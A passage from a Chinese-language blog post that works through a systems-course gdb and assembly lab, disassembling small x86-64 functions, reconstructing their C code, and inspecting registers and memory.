number\">140737488346944</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>r14            0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>r15            0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rip            0x40077f            0x40077f <span class=\"token operator\">&lt;</span>printStep2+19<span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>eflags         0x246               <span class=\"token punctuation\">[</span> PF ZF IF <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>cs             0x33                <span class=\"token number\">51</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ss             0x2b                <span class=\"token number\">43</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ds             0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>es             0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token parameter variable\">--Type</span> <span class=\"token operator\">&lt;</span>RET<span class=\"token operator\">></span> <span class=\"token keyword\">for</span> more, q to quit, c to <span class=\"token builtin class-name\">continue</span> without paging--</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>fs             0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gs             0x0                 <span class=\"token number\">0</span></pre></td></tr></table></figure><p>该处 <code>%rdi</code>  寄存器的值为 1， <code>%rsp</code>  的值为 <code>0x7fffffffde40</code> , <code>%rax</code>  的值为 <code>79</code> 。 <code>%rsp</code>  寄存器中存储的值应当是地址， <code>%rax</code>  中存储返回值， <code>%rdi</code>  中存储传入参数。</p>\n<p>接下来输入 <code>r 2</code> 。提示信息如下：</p>\n<pre><code>(gdb) r 2\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 2\nLet's look at some assembly and registers.\nThere are two styles of assembly printing: AT&amp;T and Intel\nAT&amp;T prints OP SRC, DEST, while Intel prints OP DEST, SRC\nOP - opcode or instruction such as mov, ret, add, etc\nSRC - source or input, instructions may have 0, 1, or 2 sources\nDEST - destination, update this location, instructions may have 0 or 1\n        destinations\nLinux is based on Unix which was originally developed at Bell Labs, so GNU tools\ndefault to AT&amp;T style printing.\nAlso, sometimes a DEST is also a SRC, kind of like x += 5\nType (gdb) c\nThis will continue execution, please do so after each question.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>该提示介绍了一下 <code>AT &amp; T</code>  格式和 <code>intel</code>  格式的区别，主要是 <code>src</code>  和 <code>dest</code>  的位置不一样。按照提示输入 <code>c</code>  查看：</p>\n<pre><code>(gdb) c\nContinuing.\nYou will commonly dissassemble a function.  There will be a header and footer.\nMost of the output will be 0x....... &lt;+0&gt;:  OP SRC, DEST\nThis indicates that at address 0x..., which is 0 bytes from the start of the\nfunction, there is an instruction OP with SRC and DEST as shown.\nType (gdb) disassemble squareInt\nMOV is a common and powerful instruction.  It can &quot;move&quot; (actually, copy) values\nbetween registers, load from memory, or store to memory.\n   In this case, %edi holds the argument to the function and %eax its return value.\nQ.  Fill in the blank in the pseudo C code for this function.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入 <code>disassemble squareInt</code> ，得到如下结果：</p>\n<pre><code class=\"language-asm\">(gdb) disassemble squareInt\nDump of assembler code for function squareInt:\n   0x00000000004009c3 &lt;+0&gt;:     mov    %edi,%eax\n   0x00000000004009c5 &lt;+2&gt;:     imul   %edi,%eax\n   0x00000000004009c8 &lt;+5&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>提示说 <code>%edi holds the argument to the function and %eax its return value</code> ，那么还原 <code>squareInt</code>  函数如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// x in %edi, return value in %eax</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">squareInt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输入 <code>c</code> ，提示</p>\n<pre><code>(gdb) c\nContinuing.\nType (gdb) disassemble squareLInt  (Note the L before Int)\nQ.  How do the names of the registers differ between the functions?\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>按照提示输入 <code>disassemble squareLInt</code> ，看看 <code>Q.  How do the names of the registers differ between the functions?</code> ，结果如下：</p>\n<pre><code class=\"language-asm\">Dump of assembler code for function squareLInt:\n   0x00000000004009c9 &lt;+0&gt;:     mov    %rdi,%rax\n   0x00000000004009cc &lt;+3&gt;:     imul   %rdi,%rax\n   0x00000000004009d0 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到此处使用的是 <code>%rdi</code>  和 <code>%rax</code> 。 <code>%rdi</code>  和 <code>%rax</code>  是 64 位，而 <code>%edi</code>  和 <code>%eax</code>  是 32 位。因为前面用的是 <code>int</code> ，此处可能用的是 <code>long</code> 。 <code>int</code>  类型是 4 个字节，32 位，存储在 <code>%eax</code>  和 <code>%edi</code>  中。而 <code>long</code>  类型是 64 位，可以存储在 <code>%rdi</code>  和 <code>%rax</code>  中。</p>\n<p>继续输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nsquareLInt used long ints, hence it accessed %rdi, which is 64 bits.\nsquareInt used ints, hence it accessed %edi which is the lower 32 bits of %rdi\nType (gdb) disassemble squareFloat\nQ.  Did squareFloat use the same registers from before?\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入 <code>diassemble squareFloat</code>  看看，结果如下:</p>\n<pre><code class=\"language-asm\">(gdb) disassemble squareFloat\nDump of assembler code for function squareFloat:\n   0x00000000004009d1 &lt;+0&gt;:     mulss  %xmm0,%xmm0\n   0x00000000004009d5 &lt;+4&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>浮点数和之前使用的不是同一套寄存器。继续输入 <code>c</code> ，可以看到程序退出。按照课程提示，输入 <code>r 3</code> ，提示如下：</p>\n<pre><code>Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 3\nWe are going to look at how to access memory.\nWe already saw the mov instruction between registers.  Now we will load and\nstore.  When a register is in (), then it is serving as a memory location.\nWhile mov is powerful, we cannot directly mov (%rax), (%rbx).  The ISA requires\na register to be used.\nPlease disassemble function: whatIsThis\nQ.  Knowing that %rdi is the first argument and %rsi is the second, what do\n    you think the function is doing?\nAfter you have an answer, continue execution.  The following code will loop, as\nWe conclude activity 1.  When you are finished, please exit (q &lt;enter&gt;) and run act2.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x0000000000400918 in runStep4 ()\n</code></pre>\n<p>这部分让我们掌握 <code>load &amp; store</code>  指令，输入 <code>disassemble whatIsThis</code> ，可得如下结果：</p>\n<pre><code>(gdb) disassemble whatIsThis\nDump of assembler code for function whatIsThis:\n   0x00000000004008a1 &lt;+0&gt;:     mov    (%rdi),%edx\n   0x00000000004008a3 &lt;+2&gt;:     mov    (%rsi),%eax\n   0x00000000004008a5 &lt;+4&gt;:     mov    %edx,(%rsi)\n   0x00000000004008a7 &lt;+6&gt;:     mov    %eax,(%rdi)\n   0x00000000004008a9 &lt;+8&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>其中 <code>%rdi</code>  是第一个参数， <code>%rsi</code>  是第二个参数。设第一个参数为 <code>x</code> ，第二个参数为 <code>y</code> ，(本来以为 <code>x</code>  和 <code>y</code>  是 <code>long</code>  类型整数，后来发现有指针，而赋值的变量又是 <code>int</code>  类型，那么可能 <code>x</code>  和 <code>y</code>  是 <code>int*</code>  类型的指针变量）。那么 <code>whatIsThis</code>  函数如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// x in %rdi, y in %rsi</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">whatIsThis</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> edx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> eax <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">*</span>y <span class=\"token operator\">=</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">*</span>x <span class=\"token operator\">=</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到，此函数的作用为交换两个变量的位置。输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nInput two integers to test whatIsThis: &lt;x&gt; &lt;y&gt;\n2 3\nLet's examine memory before we execute whatIsThis\nPlease type (gdb) x/8d $rsp\n  This will dump the memory (x) containing eight (8) decimal integers ([%]d)\n  starting from the stack pointer ($rsp).\nOnce you've examined the memory dump, continue.\n</code></pre>\n<blockquote>\n<p>注意 gdb 中寄存器以 <code>$</code>  开头，而不是 <code>%</code></p>\n</blockquote>\n<p>输入 <code>2 3</code> ，提示要求我们在执行 <code>whatIsThis</code>  之前，查看一下当前的内存分布。首先输入 <code>x/8d $rsp</code>  查看一下 <code>%rsp</code>  开始处 8 个整数的值。结果如下：</p>\n<pre><code>(gdb) p $rsp\n$1 = (void *) 0x7fffffffde30\n(gdb) x/8d $rsp\n0x7fffffffde30: -8384   32767   2       3\n0x7fffffffde40: 0       0       4196939 0`\n</code></pre>\n<p>输入 <code>c</code> ，提示再次查看 <code>%rsp</code>  处的值：</p>\n<pre><code>0x7fffffffde30: -8384   32767   3       2\n0x7fffffffde40: 0       0       4196939 0\n</code></pre>\n<p>可以看到 2 和 3 的位置交换了。Activity 1 完成。</p>\n<h2 id=\"activity-2\"><a class=\"markdownIt-Anchor\" href=\"#activity-2\">#</a> Activity 2</h2>\n<p>输入 <code>./act2</code> ，提示显示 <code>Did whatIsThis(): compare, swap, add, or multiply two numbers? Enter the keyword corresponding to the correct operation. </code> ，根据上一问结果，输入 <code>swap</code> 。因为 <code>whatIsThis</code>  交换了两个变量的值。提示 <code>Correct! Please rerun in gdb with r s.</code></p>\n<p>输入 <code>gdb ./act2</code> ，再输入 <code>r s</code> ，提示如下：</p>\n<pre><code>(gdb) r s\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 s\nWe are going to learn about memory access.  First, displacements.\nA displacement is an immediate added to a memory access.\nIt is of the form: D(mem), so that the address accessed is D + mem.\nPlease disassemble viewThis.\nQ.  What are the function's argument(s)?\nQ.  What is the return register of the function?\nQ.  Which instruction(s) initialize the return register?\nQ.  What does the function do?\nAfter you have your answer, please rerun with r a.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>提示要求我们反汇编 <code>viewThis</code>  函数，并且回答四个问题。输入 <code>disassemble viewThis</code> ，显示如下：</p>\n<pre><code>(gdb) disassemble viewThis\nDump of assembler code for function viewThis:\n   0x0000000000400687 &lt;+0&gt;:     mov    0x4(%rdi),%eax\n   0x000000000040068a &lt;+3&gt;:     add    (%rdi),%eax\n   0x000000000040068c &lt;+5&gt;:     add    0x8(%rdi),%eax\n   0x000000000040068f &lt;+8&gt;:     add    0xc(%rdi),%eax\n   0x0000000000400692 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>四个问题的回答分别是：</p>\n<pre><code>Q1: 函数的参数在M[%rdi + 4],M[%rdi],M[%rdi + 8],M[%rdi + 12]中\nQ2: 函数返回值在%eax中\nQ3: mov    0x4(%rdi),%eax 指令初始化了返回值寄存器%rax\nQ4: 对一个4个int类型的数组求和\n</code></pre>\n<p>根据提示，输入 <code>r a</code> ，提示信息如下：</p>\n<pre><code>(gdb) r a\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 a\nSince viewThis added 4 numbers from an array, let's look at more array\naccesses.  The general form of a memory reference is D(B,I,S)\nD + B + I * S\nDisassemble: viewThisNext.\nQ.  What does this function do?\nWe are going to call this function with array: arr.\nPrint its address with: p/x &amp;arr\nThen continue.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>上一题答对啦： <code>viewThis</code>  就是累加 4 个 int 类型元素的数组。输入 <code>disassemble viewThisNext</code> ，显示如下：</p>\n<pre><code>(gdb) disassemble viewThisNext\nDump of assembler code for function viewThisNext:\n   0x0000000000400693 &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x0000000000400696 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>上述代码的逻辑为： <code>int ret = *(rdi + rsi * 4); 因为汇编代码是从字节出发，而</code>  C <code>代码的指针递增，每次加</code>  sizeof (T) <code>个字节。这里是</code>  4 <code>,那么推测</code>  sizeof (T) = 4 <code>，这里的类型应该是 int。那么</code>  % rdi <code>应该是数组的起始位置，</code> %rsi <code>等于要取的数字的索引，最后返回到</code>  % eax` 中。其 C 语言描述如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">get_val</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> arr<span class=\"token punctuation\">,</span><span class=\"token keyword\">long</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输入 <code>p/x &amp;arr</code> ，结果如下：</p>\n<pre><code>(gdb) p/x &amp;arr\n$1 = 0x602080\n</code></pre>\n<p>输入 <code>x/10d &amp;arr</code>  来打印从 <code>arr</code>  地址开始处后 10 个整数。显示结果如下：</p>\n<pre><code>(gdb) x/10d &amp;arr\n0x602080 &lt;arr&gt;: 0       1       2       3\n0x602090 &lt;arr+16&gt;:      4       5       6       7\n0x6020a0 &lt;arr+32&gt;:      8       9\n</code></pre>\n<p>可以看到 arr 地址开始后存储了 10 个整数，从 0 到 9。输入 <code>c</code>  继续，提示显示：</p>\n<pre><code>(gdb) c\nContinuing.\nNow we'll actually call viewThisNext.  Please input a number between 0 and 9.\n5\nYou requested: 0x602094 = 5\n\nNow rerun with r L.\n[Inferior 1 (process 42895) exited normally]\n</code></pre>\n<p>我想要 5，该值在 0x605094 位置处。输入 <code>r L</code> 。提示如下：</p>\n<pre><code>(gdb) r L\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 L\nMany times, the compiler will need to compute the address before it is used.\nThe instruction LEA provides this capability.\nDisassemble: viewThisL.\nIt does the same calculation as before, except it passes along the pointer.\nOnce you're done looking at the disassembly dump, continue.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入 <code>diassemble viewThisL</code>  后，提示显示：</p>\n<pre><code>(gdb) disassemble viewThisL\nDump of assembler code for function viewThisL:\n   0x0000000000400697 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x000000000040069b &lt;+4&gt;:     lea    (%rdi,%rsi,4),%rdi\n   0x000000000040069f &lt;+8&gt;:     callq  0x4004e0 &lt;free@plt&gt;\n   0x00000000004006a4 &lt;+13&gt;:    add    $0x8,%rsp\n   0x00000000004006a8 &lt;+17&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nLEA can also be used to do actual math.  The function mx mutliplies its\nargument by some value.  Note the use of the SHL instruction to left shift.\nDisassemble: mx.\nQ.  Write down the four parts of LEA's displacement-mode address.\nQ.  After accounting for the left shift, what value does mx() multiply its argument by?\nFor your final exercise, leave gdb and type head -n 8 act3.c.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入 <code>disassemble mx</code> ，显示结果如下：</p>\n<pre><code>(gdb) disassemble mx\nDump of assembler code for function mx:\n   0x00000000004006a9 &lt;+0&gt;:     lea    (%rdi,%rdi,2),%rax\n   0x00000000004006ad &lt;+4&gt;:     shl    $0x2,%rax\n   0x00000000004006b1 &lt;+8&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>LEA 内存地址偏移计算模式为 D (B,I,S)。其中地址 = B + I*S + D。这里的指令为 <code>lea    (%rdi,%rdi,2),%rax</code> 。那么结果为 <code>%rax = %rdi + 2 * %rdi = 3 \\_ %rdi</code> 。然后左移两位，也就是 * 4。最后 <code>%rax</code>  的值为 <code>12 \\* %rdi</code> 。</p>\n<h2 id=\"activity-3\"><a class=\"markdownIt-Anchor\" href=\"#activity-3\">#</a> Activity 3</h2>\n<p>接下来，退出 gdb，并且输入 <code>head -n 8 act3.c</code> 。显示如下：</p>\n<pre><code>//\n// This quick activity looks at compilation and assembly.\n//   type gcc -Og -S act3.c\n// Then view act3.s in your favorite editor\n//   Notice the assembly is there, plus some other lines.\n// Now compile with gcc -Og -c act3.c\n// Then type objdump -d act3.o\n//\n</code></pre>\n<p>根据提示，输入 <code>gcc -Og -S act3.c</code> ，然后输入 <code>objdump -d act3.o</code> 。显示如下：</p>\n<pre><code class=\"language-asm\">\nact3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;mx&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   48 8d 04 7f             lea    (%rdi,%rdi,2),%rax\n   8:   48 c1 e0 02             shl    $0x2,%rax\n   c:   c3                      retq\n\n000000000000000d &lt;addm&gt;:\n   d:   f3 0f 1e fa             endbr64\n  11:   e8 00 00 00 00          callq  16 &lt;addm+0x9&gt;\n  16:   48 83 c0 01             add    $0x1,%rax\n  1a:   c3                      retq\n</code></pre>\n",
            "tags": []
        }
    ]
}